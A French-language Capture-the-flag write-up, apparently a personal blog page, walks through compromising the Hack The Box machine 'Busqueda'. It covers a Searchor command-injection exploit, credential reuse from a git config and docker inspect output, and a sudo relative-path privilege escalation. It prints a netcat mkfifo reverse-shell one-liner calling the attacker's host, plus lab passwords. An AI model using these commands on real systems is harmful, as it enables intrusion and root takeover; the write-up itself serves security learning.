@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>htb Busqueda</title>
+	<link href="https://jurassi.ch/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed for blog posts" />
+	<style>
+		body {
+			font-family: sans-serif;
+			margin: 0 auto;
+			max-width: 48rem;
+			line-height: 1.45;
+			padding: 0.5rem 0 1.6rem;
+			#box-shadow: 0 0 2rem 0 #bbb;
+			#border-radius: 0 0 0.6rem 0.6rem;
+		}
+		main {
+			padding: 0 1.4rem;
+			hyphens: auto;
+		}
+		code {
+			background: #eee;
+			padding: 0.3rem;
+			tab-size: 4;
+		}
+		pre code {
+			display: block;
+			overflow-x: auto;
+			padding: 0.3rem 0.6rem;
+		}
+
+		nav ul {
+			margin: 0;
+			padding: 0;
+			display: flex;
+			background: #a11;
+		}
+		nav li {
+			list-style: none;
+		}
+		nav li * {
+			display: block;
+			padding: 0.4rem 0.4rem;
+			color: white;
+		}
+		nav li strong {
+			padding-left: 1.5rem;
+			padding-right: 1rem;
+		}
+		nav a {
+			text-decoration: none;
+		}
+		nav a:hover {
+			background: #ad4949;
+		}
+	</style>
+</head>
+
+<nav>
+	<ul>
+		<li><strong>Jurassi.ch</strong></li>
+		<li><a href="index.html">/home</a></li>
+		<li><a href="about.html">about</a></li>
+	</ul>
+</nav>
+
+<main>
+<h1>htb Busqueda</h1>
+<p>Résumé : l'exploitation d'une vulnérabilité de type injection de commandes permet d'obtenir un accès non privilégié à la machine. On découvre des crédentiels dans la configuration git, qui nous permettent de nous connecter à gitea. De la lecture du code d'un script nous déduisons la présence d'une vulnérabilité introduite par l'utilisation d'un chemin relatif par ce script. Ce script peu sécurisé peut être utilisé en sudo, et nous permet d’exécuter du code à distance avec les privilèges root.</p>
+<h2>Enumeration</h2>
+<p>Nmap permet d'identifier un site sur le port 80 : http://searcher.htb/. </p>
+<pre><code>$ nmap -sC -sV -vv 10.129.140.129
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 12:54 BST
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Initiating Ping Scan at 12:54
+Scanning 10.129.140.129 [2 ports]
+Completed Ping Scan at 12:54, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:54
+Completed Parallel DNS resolution of 1 host. at 12:54, 0.00s elapsed
+Initiating Connect Scan at 12:54
+Scanning 10.129.140.129 [1000 ports]
+Discovered open port 22/tcp on 10.129.140.129
+Discovered open port 80/tcp on 10.129.140.129
+Completed Connect Scan at 12:54, 1.33s elapsed (1000 total ports)
+Initiating Service scan at 12:54
+Scanning 2 services on 10.129.140.129
+Completed Service scan at 12:54, 6.18s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.140.129.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 2.56s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.34s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Nmap scan report for 10.129.140.129
+Host is up, received syn-ack (0.086s latency).
+Scanned at 2023-08-10 12:54:47 BST for 11s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
+</code></pre>
+<p>Après modification du <code>/etc/hosts</code> j'accède au site.</p>
+<pre><code>echo &quot;10.129.140.129 searcher.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<h2>Vulnérabilité du site</h2>
+<p>Le site utilise l'application "Searchor 2.4.0" selon une information affichée en bas de page. Une vulnérabilité et un exploit existent pour cette application. La vulnérabilité est due à une absence de vérification des entrées utilisateurs, qui permet une injection de commande.</p>
+<p>https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</p>
+<h2>Exploitation</h2>
+<p>Un netcat écoute les connexions entrantes sur ma machine attaquant.</p>
+<pre><code>$ nc -nlvp 9001
+</code></pre>
+<p>Et je lance l'<a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">exploit</a>.</p>
+<pre><code>$ ./exploit.sh searcher.htb 10.10.14.72 9001
+---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---
+[*] Input target is searcher.htb
+[*] Input attacker is 10.10.14.72:9001
+[*] Run the Reverse Shell... Press Ctrl+C after successful connection
+</code></pre>
+<p>J'obtiens un shell non privilégié.</p>
+<pre><code>$ nc -nlvp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.129.140.129.
+Ncat: Connection from 10.129.140.129:35032.
+bash: cannot set terminal process group (1485): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$
+</code></pre>
+<h2>Enumération</h2>
+<p>J'observe le contenu du dossier en cours. Je découvre git et une configuration qui contient un mot de passe.</p>
+<pre><code>svc@busqueda:/var/www/app$ ls -lha
+ls -lha
+total 20K
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Aug 10 11:44 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
+svc@busqueda:/var/www/app$ ls -l .git	
+ls -l .git
+total 44
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+
+svc@busqueda:/var/www/app$ cd .git
+cd .git
+svc@busqueda:/var/www/app/.git$ ls
+ls
+branches
+COMMIT_EDITMSG
+config
+description
+HEAD
+hooks
+index
+info
+logs
+objects
+refs
+
+svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote &quot;origin&quot;]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch &quot;main&quot;]
+	remote = origin
+	merge = refs/heads/main
+</code></pre>
+<p>Notons qu'il existe un autre domaine qui porte un gitea : http://gitea.searcher.htb/</p>
+<p>Je tente d'utiliser le mot de passe comme mot de passe sudo.</p>
+<pre><code>svc@busqueda:/var/www/app/.git$ sudo -S -l
+sudo -S -l
+[sudo] password for svc: jh1usoih2bkjaspwe92
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+svc@busqueda:/var/www/app/.git$ 
+</code></pre>
+<p>Ce script system-checkup.py peut être utilisé par l'utilisateur svc.</p>
+<pre><code>svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd
+&lt;/python3 /opt/scripts/system-checkup.py /etc/passwd
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+</code></pre>
+<p>Il permet de lister le conteneurs.</p>
+<pre><code>svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+&lt;in/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   7 months ago   Up 47 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   7 months ago   Up 47 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</code></pre>
+<p>Et de lancer la commande <a href="https://docs.docker.com/engine/reference/commandline/inspect/">inspect</a> de docker. Il faut passer en argument le format et l'ID du conteneur à "inspecter".</p>
+<p>On obtient le mot de passe de la BDD MySql du site.</p>
+<pre><code>svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ json .Config}}' 960873171e2e
+&lt;.py docker-inspect '{{ json .Config}}' 960873171e2e
+{&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:{&quot;22/tcp&quot;:{},&quot;3000/tcp&quot;:{}},&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:{&quot;/data&quot;:{},&quot;/etc/localtime&quot;:{},&quot;/etc/timezone&quot;:{}},&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:{&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;}}
+</code></pre>
+<p>En utilisant <code>jq</code>, voici un affichage plus digeste de la partie intéressante.</p>
+<pre><code>...
+&quot;Env&quot;: [
+    &quot;USER_UID=115&quot;,
+    &quot;USER_GID=121&quot;,
+    &quot;GITEA__database__DB_TYPE=mysql&quot;,
+    &quot;GITEA__database__HOST=db:3306&quot;,
+    &quot;GITEA__database__NAME=gitea&quot;,
+    &quot;GITEA__database__USER=gitea&quot;,
+    &quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,
+    &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,
+    &quot;USER=git&quot;,
+    &quot;GITEA_CUSTOM=/data/gitea&quot;
+  ],
+...
+</code></pre>
+<p>Le mot de passe est réutilisé pour se connecter sur ce site gitea avec administrator / yuiu1hoiu4i5ho1uh.</p>
+<p>Dans gitea je peux maintant lire le contenant du script initial : <code>system-checkup.py</code></p>
+<p>Je découvre grâce au code que l'option full-checkup lance un script <code>./full-checkup.sh</code>. Il est donc théoriquement possible de créer un <code>full-checkup.sh</code> malicieux, et de l'exécuter depuis n'importe quelle location. En l'occurrence depuis une location dans laquelle l'utilisateur a les droits d'écriture (/tmp par exemple). </p>
+<pre><code>    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+</code></pre>
+<p>On peut insérer un reverse shell dans <code>/tmp/full-checkup.sh</code>.</p>
+<pre><code>echo -en &quot;#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.72 9002 &gt;/tmp/f&quot; &gt; /tmp/full-checkup.sh
+</code></pre>
+<p>Puis :</p>
+<pre><code>chmod +x /tmp/full-checkup.sh
+cd /tmp
+sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre>
+<p>Sur notre machine attaquant, avec un netcat en écoute un reçoit la connexion entrante, en root.</p>
+<pre><code>$ nc -nlvp 9002
+</code></pre>
+<small>Written on 2023-09-11.</small>
+\n</main>
